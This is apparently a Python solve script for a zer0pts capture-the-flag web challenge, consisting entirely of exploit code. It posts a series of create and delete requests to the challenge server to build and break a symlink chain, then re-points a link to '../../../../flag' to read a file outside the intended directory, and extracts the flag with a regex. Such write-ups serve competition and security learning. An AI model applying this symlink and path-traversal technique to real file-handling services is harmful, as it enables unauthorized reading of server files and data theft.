#!/usr/bin/env python

import re
import requests

BASE = 'http://web.ctf.zer0pts.com:8001/'
sess = requests.Session()
sess.get(BASE)

# make a -> b -> c
sess.post(BASE, data={
  'name': 'c', 'type': '', 'mode': 'create', 'target': '.'
})
sess.post(BASE, data={
  'name': 'b', 'type': '', 'mode': 'create', 'target': 'c'
})
sess.post(BASE, data={
  'name': 'a', 'type': '', 'mode': 'create', 'target': 'b'
})

# delete c
sess.post(BASE, data={
  'name': 'c', 'mode': 'delete'
})

# make symlink('../../../../flag', 'a')
sess.post(BASE, data={
  'name': 'a', 'type': '', 'mode': 'create', 'target': '../../../../flag'
})

# :)
req = sess.post(BASE, data={
  'name': 'a', 'mode': 'read'
})
print(re.findall(r'zer0pts\{.+?\}', req.text)[0])

# zer0pts{[Use-After-FreeLink?](https://gruss.cc/files/uafmail.pdf)}